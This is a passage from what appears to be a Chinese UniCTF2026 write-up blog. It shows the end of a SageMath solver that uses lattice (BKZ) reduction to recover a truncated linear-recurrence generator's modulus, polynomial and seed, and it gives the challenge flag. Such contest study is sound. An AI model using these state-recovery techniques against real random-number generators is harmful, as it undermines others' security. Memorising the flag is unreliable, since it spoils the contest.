class="line"><span class="string">f_poly</span> <span class="string">=</span> <span class="string">polys[0].gcd(polys[1])</span></span><br><span class="line"><span class="attr">if not f_poly.is_zero():</span></span><br><span class="line"><span class="string">f_poly</span> <span class="string">=</span> <span class="string">f_poly</span> <span class="string">*</span> <span class="string">f_poly.leading_coefficient().inverse_of_unit()</span></span><br><span class="line"><span class="string">end</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">print(f&quot;Step</span> <span class="attr">3 Done. Time:</span> &#123;<span class="string">end</span> <span class="bullet">-</span> <span class="string">start:.4f</span>&#125;<span class="string">s\n&quot;)</span></span><br><span class="line"><span class="string">return</span> <span class="string">f_poly</span></span><br><span class="line"><span class="string">def</span> <span class="string">Recover_the_initial_state(y_vec,</span> <span class="string">f_poly,</span> <span class="string">m,</span> <span class="string">n,</span> <span class="attr">beta):</span></span><br><span class="line"><span class="string">start</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">print(&quot;Step</span> <span class="attr">4 Start:</span> <span class="string">Recovering</span> <span class="string">Initial</span> <span class="string">State...&quot;)</span></span><br><span class="line"><span class="string">d</span> <span class="string">=</span> <span class="number">30</span></span><br><span class="line"><span class="string">coeffs</span> <span class="string">=</span> <span class="string">f_poly.list()</span></span><br><span class="line"><span class="string">while</span> <span class="string">len(coeffs)</span> <span class="string">&lt;</span> <span class="attr">n:</span></span><br><span class="line"><span class="string">coeffs.append(0)</span></span><br><span class="line"><span class="string">Q</span> <span class="string">=</span> <span class="string">Matrix(Zmod(m),</span> <span class="string">n,</span> <span class="string">n)</span></span><br><span class="line"><span class="string">Q_power</span> <span class="string">=</span> <span class="string">identity_matrix(Zmod(m),</span> <span class="string">n)</span></span><br><span class="line"><span class="string">Q[0,</span> <span class="string">n</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">]</span> <span class="string">=</span> <span class="string">-coeffs[0]</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(1,</span> <span class="attr">n):</span></span><br><span class="line"><span class="string">Q[i,</span> <span class="string">i</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">]</span> <span class="string">=</span> <span class="number">1</span></span><br><span class="line"><span class="string">Q[i,</span> <span class="string">n</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">]</span> <span class="string">=</span> <span class="string">-coeffs[i]</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(1,</span> <span class="attr">n):</span></span><br><span class="line"><span class="string">Q_power</span> <span class="string">=</span> <span class="string">Q_power</span> <span class="string">*</span> <span class="string">Q</span></span><br><span class="line"><span class="string">pow_2_beta</span> <span class="string">=</span> <span class="number">2</span><span class="string">**beta</span></span><br><span class="line"><span class="string">pow_2_beta_minus_1</span> <span class="string">=</span> <span class="number">2</span><span class="string">**(beta</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">)</span></span><br><span class="line"><span class="string">L</span> <span class="string">=</span> <span class="string">Matrix(ZZ,</span> <span class="string">d</span> <span class="string">+</span> <span class="number">1</span><span class="string">,</span> <span class="string">d</span> <span class="string">+</span> <span class="number">1</span><span class="string">)</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(n,</span> <span class="attr">d):</span></span><br><span class="line"><span class="string">Q_power</span> <span class="string">=</span> <span class="string">Q_power</span> <span class="string">*</span> <span class="string">Q</span></span><br><span class="line"><span class="string">b</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line"><span class="attr">for j in range(n):</span></span><br><span class="line"><span class="string">val</span> <span class="string">=</span> <span class="string">Integer(Q_power[j,</span> <span class="number">0</span><span class="string">])</span></span><br><span class="line"><span class="string">L[j</span> <span class="string">+</span> <span class="number">1</span><span class="string">,</span> <span class="string">i</span> <span class="string">+</span> <span class="number">1</span><span class="string">]</span> <span class="string">=</span> <span class="string">val</span></span><br><span class="line"><span class="string">b</span> <span class="string">+=</span> <span class="string">val</span> <span class="string">*</span> <span class="string">y_vec[j]</span></span><br><span class="line"><span class="string">term</span> <span class="string">=</span> <span class="string">(pow_2_beta</span> <span class="string">*</span> <span class="string">(y_vec[i]</span> <span class="bullet">-</span> <span class="string">b))</span> <span class="string">%</span> <span class="string">m</span></span><br><span class="line"><span class="string">L[0,</span> <span class="string">i</span> <span class="string">+</span> <span class="number">1</span><span class="string">]</span> <span class="string">=</span> <span class="string">term</span> <span class="string">+</span> <span class="string">pow_2_beta_minus_1</span></span><br><span class="line"><span class="string">L[0,</span> <span class="number">0</span><span class="string">]</span> <span class="string">=</span> <span class="string">pow_2_beta_minus_1</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(1,</span> <span class="string">n</span> <span class="string">+</span> <span class="attr">1):</span></span><br><span class="line"><span class="string">L[0,</span> <span class="string">i]</span> <span class="string">=</span> <span class="string">pow_2_beta_minus_1</span></span><br><span class="line"><span class="string">L[i,</span> <span class="string">i]</span> <span class="string">=</span> <span class="number">1</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(n</span> <span class="string">+</span> <span class="number">1</span><span class="string">,</span> <span class="string">d</span> <span class="string">+</span> <span class="attr">1):</span></span><br><span class="line"><span class="string">L[i,</span> <span class="string">i]</span> <span class="string">=</span> <span class="string">m</span></span><br><span class="line"><span class="string">print(&quot;Reducing</span> <span class="string">final</span> <span class="string">lattice...&quot;)</span></span><br><span class="line"><span class="string">L</span> <span class="string">=</span> <span class="string">L.BKZ(block_size=20)</span></span><br><span class="line"><span class="string">z</span> <span class="string">=</span> [<span class="number">0</span>] <span class="string">*</span> <span class="string">n</span></span><br><span class="line"><span class="string">a_res</span> <span class="string">=</span> [<span class="number">0</span>] <span class="string">*</span> <span class="string">n</span></span><br><span class="line"><span class="string">row</span> <span class="string">=</span> <span class="string">L[0]</span></span><br><span class="line"><span class="string">bias</span> <span class="string">=</span> <span class="string">pow_2_beta_minus_1</span></span><br><span class="line"><span class="string">if</span> <span class="string">row[0]</span> <span class="string">==</span> <span class="string">-bias:</span></span><br><span class="line"><span class="attr">for i in range(n):</span></span><br><span class="line"><span class="string">z[i]</span> <span class="string">=</span> <span class="string">row[i</span> <span class="string">+</span> <span class="number">1</span><span class="string">]</span> <span class="string">+</span> <span class="string">bias</span></span><br><span class="line"><span class="string">a_res[i]</span> <span class="string">=</span> <span class="string">y_vec[i]</span> <span class="string">*</span> <span class="string">pow_2_beta</span> <span class="string">+</span> <span class="string">z[i]</span></span><br><span class="line"><span class="string">elif</span> <span class="string">row[0]</span> <span class="string">==</span> <span class="attr">bias:</span></span><br><span class="line"><span class="attr">for i in range(n):</span></span><br><span class="line"><span class="string">z[i]</span> <span class="string">=</span> <span class="string">bias</span> <span class="bullet">-</span> <span class="string">row[i</span> <span class="string">+</span> <span class="number">1</span><span class="string">]</span></span><br><span class="line"><span class="string">a_res[i]</span> <span class="string">=</span> <span class="string">y_vec[i]</span> <span class="string">*</span> <span class="string">pow_2_beta</span> <span class="string">+</span> <span class="string">z[i]</span></span><br><span class="line"><span class="attr">else:</span></span><br><span class="line"><span class="attr">for i in range(n):</span></span><br><span class="line"><span class="string">z[i]</span> <span class="string">=</span> <span class="string">bias</span> <span class="bullet">-</span> <span class="string">row[i</span> <span class="string">+</span> <span class="number">1</span><span class="string">]</span></span><br><span class="line"><span class="string">a_res[i]</span> <span class="string">=</span> <span class="string">y_vec[i]</span> <span class="string">*</span> <span class="string">pow_2_beta</span> <span class="string">+</span> <span class="string">z[i]</span></span><br><span class="line"><span class="string">end</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">print(f&quot;Step</span> <span class="attr">4 Done. Time:</span> &#123;<span class="string">end</span> <span class="bullet">-</span> <span class="string">start:.4f</span>&#125;<span class="string">s\n&quot;)</span></span><br><span class="line"><span class="string">return</span> <span class="string">vector(ZZ,</span> <span class="string">a_res)</span></span><br><span class="line"><span class="string">def</span> <span class="string">Backtrack_to_s(a_observed,</span> <span class="string">f_poly,</span> <span class="attr">m):</span></span><br><span class="line"><span class="string">print(&quot;Backtracking</span> <span class="string">to</span> <span class="string">recover</span> <span class="string">s_0...s_15...&quot;)</span></span><br><span class="line"><span class="string">f_coeffs</span> <span class="string">=</span> <span class="string">f_poly.list()</span></span><br><span class="line"><span class="string">C_题目</span> <span class="string">=</span> [<span class="string">(-Integer(f_coeffs</span>[<span class="string">i</span>]<span class="string">))</span> <span class="string">%</span> <span class="string">m</span> <span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(16)</span>]</span><br><span class="line"><span class="string">c0</span> <span class="string">=</span> <span class="string">C_题目[0]</span></span><br><span class="line"><span class="string">c0_inv</span> <span class="string">=</span> <span class="string">pow(Integer(c0),</span> <span class="number">-1</span><span class="string">,</span> <span class="string">Integer(m))</span></span><br><span class="line"><span class="string">curr</span> <span class="string">=</span> [<span class="string">Integer(x)</span> <span class="string">for</span> <span class="string">x</span> <span class="string">in</span> <span class="string">a_observed</span>]</span><br><span class="line"><span class="attr">for _ in range(16):</span></span><br><span class="line"><span class="string">a_next</span> <span class="string">=</span> <span class="string">curr[-1]</span></span><br><span class="line"><span class="string">sum_part</span> <span class="string">=</span> <span class="string">sum(C_题目[j]</span> <span class="string">*</span> <span class="string">curr[j-1]</span> <span class="string">for</span> <span class="string">j</span> <span class="string">in</span> <span class="string">range(1,</span> <span class="number">16</span><span class="string">))</span></span><br><span class="line"><span class="string">a_prev</span> <span class="string">=</span> <span class="string">(Integer(a_next)</span> <span class="bullet">-</span> <span class="string">sum_part)</span> <span class="string">*</span> <span class="string">c0_inv</span> <span class="string">%</span> <span class="string">m</span></span><br><span class="line"><span class="string">curr</span> <span class="string">=</span> [<span class="string">a_prev</span>] <span class="string">+</span> <span class="string">curr[:-1]</span></span><br><span class="line"><span class="string">return</span> <span class="string">curr</span></span><br><span class="line"><span class="attr">def main():</span></span><br><span class="line"><span class="attr">try:</span></span><br><span class="line"><span class="string">C</span> <span class="string">=</span> <span class="string">Search_linear_relations(y,</span> <span class="string">r,</span> <span class="string">t)</span></span><br><span class="line"><span class="string">m</span> <span class="string">=</span> <span class="string">Recover_the_modulus(C,</span> <span class="string">r)</span></span><br><span class="line"><span class="string">print(f&quot;m</span> <span class="string">=</span> &#123;<span class="string">m</span>&#125;<span class="string">\n&quot;)</span></span><br><span class="line"><span class="string">if</span> <span class="string">m</span> <span class="string">&gt;</span> <span class="attr">1:</span></span><br><span class="line"><span class="string">f</span> <span class="string">=</span> <span class="string">Recover_the_coefficients(C,</span> <span class="string">m,</span> <span class="string">r)</span></span><br><span class="line"><span class="string">print(f&quot;f</span> <span class="string">=</span> &#123;<span class="string">f</span>&#125;<span class="string">\n&quot;)</span></span><br><span class="line"><span class="string">a_16_31</span> <span class="string">=</span> <span class="string">Recover_the_initial_state(y,</span> <span class="string">f,</span> <span class="string">m,</span> <span class="string">n,</span> <span class="string">beta)</span></span><br><span class="line"><span class="string">print(f&quot;Recovered</span> <span class="attr">State (a16-a31):</span> &#123;<span class="string">a_16_31</span>&#125;<span class="string">\n&quot;)</span></span><br><span class="line"><span class="string">s</span> <span class="string">=</span> <span class="string">Backtrack_to_s(a_16_31,</span> <span class="string">f,</span> <span class="string">m)</span></span><br><span class="line"><span class="string">print(f&quot;Original</span> <span class="attr">s_0...s_15:</span> &#123;<span class="string">s</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">print(f&quot;</span><span class="string">\n[!!!]</span> <span class="attr">FLAG ANSWER (sum(s)):</span> &#123;<span class="string">sum(s)</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">print(&quot;</span><span class="string">Modulus</span> <span class="string">recovery</span> <span class="string">failed</span> <span class="string">(m=1).&quot;)</span></span><br><span class="line"><span class="attr">except Exception as e:</span></span><br><span class="line"><span class="string">print(f&quot;An</span> <span class="attr">error occurred:</span> &#123;<span class="string">e</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">import traceback</span></span><br><span class="line"><span class="string">traceback.print_exc()</span></span><br><span class="line"><span class="string">if __name__ == &quot;</span><span class="string">__main__&quot;:</span></span><br><span class="line"><span class="string">main()</span></span><br><span class="line"><span class="comment">#sum = 6052308629</span></span><br></pre></td></tr></table></figure>

<p>我们可知：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = x^16 + 1061480484<span class="emphasis">*x^15 + 48081413*</span>x^14 + 205236949<span class="emphasis">*x^13 + 705436324*</span>x^12 + 1022080694<span class="emphasis">*x^11 +</span></span><br><span class="line"><span class="emphasis">744271993*</span>x^10 + 1381450323<span class="emphasis">*x^9 + 33067342*</span>x^8 + 1927170703<span class="emphasis">*x^7 + 343566733*</span>x^6 + 82214740<span class="emphasis">*x^5 + 504049168*</span>x^4</span><br><span class="line"><span class="bullet">+</span> 272859108<span class="emphasis">*x^3 + 1189439289*</span>x^2 + 2119376914<span class="emphasis">*x + 1229585635</span></span><br></pre></td></tr></table></figure>

<p>最后得到flag:UniCTF{94364aff-5abb-4583-9042-ea0a11876907}</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803211009219.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803211009219.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">Onesword</div><div class="post-copyright__author_desc">满堂花醉三千客，一剑霜寒十四州</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://onesword-xt.github.io/posts/UniCTF2026.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://onesword-xt.github.io/posts/UniCTF2026.html')">UniCTF2026</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://onesword-xt.github.io/posts/UniCTF2026.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=UniCTF2026&amp;url=https://onesword-xt.github.io/posts/UniCTF2026.html&amp;pic=https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://onesword-xt.github.io" target="_blank">OneSword</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/wp/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>wp<span class="categoryesPageCount">3</span></a></div><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/wp/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>wp<span class="tagsPageCount">3</span></a></div></div><div class="post_share"><div class="social-share" data-image="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/knight2026.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20260122200442776.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">knight2026</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/53dec9d0.html" title="H&amp;NCTF2025"><img class="cover" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250612220711939.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-01-18</div><div class="title">H&amp;NCTF2025</div></div></a></div><div><a href="/posts/knight2026.html" title="knight2026"><img class="cover" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20260122200442776.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-01-22</div><div class="title">knight2026</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803211009219.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">欢迎来到魔法信息堡, 希望你在这里找到所需的知识和教程, 开启一段充满魔法的奇妙之旅!</div></div></div><div class="card-widget" id="card-poem"><div id="poem_sentence"></div><div id="poem_info"><div id="poem_dynasty"></div><div id="poem_author"></div></div></div><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js" charset="utf-8"></script><script type="text/javascript">jinrishici.load(function(result) {
var sentence = document.querySelector("#poem_sentence")
var author = document.querySelector("#poem_author")
var dynasty = document.querySelector("#poem_dynasty")

var sentenceText = result.data.content
sentenceText = sentenceText.substr(0, sentenceText.length - 1);
sentence.innerHTML = sentenceText
dynasty.innerHTML = result.data.origin.dynasty
author.innerHTML = result.data.origin.author + '《' + result.data.origin.title + '》'
});</script><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-java"><span class="toc-text">ez java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureDoc"><span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezUpload"><span class="toc-text">ezUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezUpload-Revenge"><span class="toc-text">ezUpload Revenge!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GlyphWeaver"><span class="toc-text">GlyphWeaver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intrasight"><span class="toc-text">Intrasight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gogogos"><span class="toc-text">gogogos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bytecode-Compiler"><span class="toc-text">Bytecode Compiler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%8E%82%E5%BA%94%E6%80%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">工厂应急流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cube-God"><span class="toc-text">Cube God</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-in"><span class="toc-text">Sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silent-resolver"><span class="toc-text">Silent resolver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E7%9A%84%E7%BA%BF%E7%B4%A2"><span class="toc-text">截取的线索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%EF%BC%9F%E6%88%91%E4%B8%8D%E6%98%AF%E6%B1%87%E7%BC%96%E9%AB%98%E6%89%8B%E5%90%97%EF%BC%9F"><span class="toc-text">什么？我不是汇编高手吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smcode"><span class="toc-text">smcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#speak"><span class="toc-text">speak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Uni-check"><span class="toc-text">Uni_check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sur-prize"><span class="toc-text">Sur prize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZIO"><span class="toc-text">EZIO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84pwn"><span class="toc-text">简单的pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shadow"><span class="toc-text">shadow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Micro-Macro"><span class="toc-text">Micro?Macro!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SetImm-0x3a"><span class="toc-text">1. SetImm (0x3a)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Add-0x7e"><span class="toc-text">2. Add (0x7e)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Load-0x52"><span class="toc-text">3. Load (0x52)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Store-0xc4"><span class="toc-text">4. Store (0xc4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Call-0x1b"><span class="toc-text">5. Call (0x1b)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Macro-Micro"><span class="toc-text">Macro?Micro!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc"><span class="toc-text">泄露 libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell-%E7%A8%8B%E5%BA%8F%E5%85%B3%E9%94%AE%E4%BF%AE%E5%A4%8D"><span class="toc-text">Shell 程序关键修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Store-%E6%BA%A2%E5%87%BA%E5%86%99%E5%85%A5-TYPE-FUNC"><span class="toc-text">Store 溢出写入 TYPE_FUNC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81-TARGET-%E9%80%89%E6%8B%A9"><span class="toc-text">动态 TARGET 选择</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#c-sm4"><span class="toc-text">c_sm4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-polynomial"><span class="toc-text">c_polynomial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#r-zip"><span class="toc-text">r_zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%A5%9E%EF%BC%81%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="toc-text">原神！启动！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Strange-Py"><span class="toc-text">Strange_Py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93"><span class="toc-text">逆向分析总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E4%BA%BA%E7%B1%BB%E5%90%97%EF%BC%9F"><span class="toc-text">是人类吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#r-png"><span class="toc-text">r_png</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Subgroup-Weaver"><span class="toc-text">Subgroup-Weaver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTRU"><span class="toc-text">NTRU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subgroup-dlp"><span class="toc-text">subgroup_dlp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subgroup-lattice"><span class="toc-text">subgroup_lattice</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/UniCTF2026.html" title="UniCTF2026"><img src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UniCTF2026"/></a><div class="content"><a class="title" href="/posts/UniCTF2026.html" title="UniCTF2026">UniCTF2026</a><time datetime="2026-02-03T18:23:22.619Z" title="发表于 2026-02-04 02:23:22">2026-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/knight2026.html" title="knight2026"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20260122200442776.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="knight2026"/></a><div class="content"><a class="title" href="/posts/knight2026.html" title="knight2026">knight2026</a><time datetime="2026-01-22T12:09:15.395Z" title="发表于 2026-01-22 20:09:15">2026-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/53dec9d0.html" title="H&amp;NCTF2025"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250612220711939.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="H&amp;NCTF2025"/></a><div class="content"><a class="title" href="/posts/53dec9d0.html" title="H&amp;NCTF2025">H&amp;NCTF2025</a><time datetime="2026-01-18T08:26:23.877Z" title="发表于 2026-01-18 16:26:23">2026-01-18</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2025 - 2026 By <a class="footer-bar-link" href="/" title="Onesword" target="_blank">Onesword</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">3</div></a><a 